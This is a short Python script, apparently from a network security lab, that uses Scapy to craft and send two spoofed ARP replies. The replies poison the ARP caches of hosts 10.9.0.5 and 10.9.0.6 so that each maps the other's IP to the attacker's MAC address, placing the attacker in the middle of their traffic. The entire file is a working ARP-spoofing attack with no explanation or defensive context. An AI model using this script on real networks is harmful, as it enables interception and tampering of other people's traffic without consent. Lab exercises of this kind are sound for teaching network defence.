#!/usr/bin/python3
from scapy.all import *

ETHER_1 = Ether(dst='02:42:0a:09:00:05',src='02:42:0a:09:00:69')

ETHER_2 = Ether(dst='02:42:0a:09:00:06',src='02:42:0a:09:00:69')

ARP_VAR1 = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05',
               pdst='10.9.0.5')

ARP_VAR2 = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.5',hwdst='02:42:0a:09:00:06',
               pdst='10.9.0.6')


pkt_1 = ETHER_1/ARP_VAR1
pkt_2 = ETHER_2/ARP_VAR2


pkt_1.show()
pkt_2.show()

sendp(pkt_1)
sendp(pkt_2)


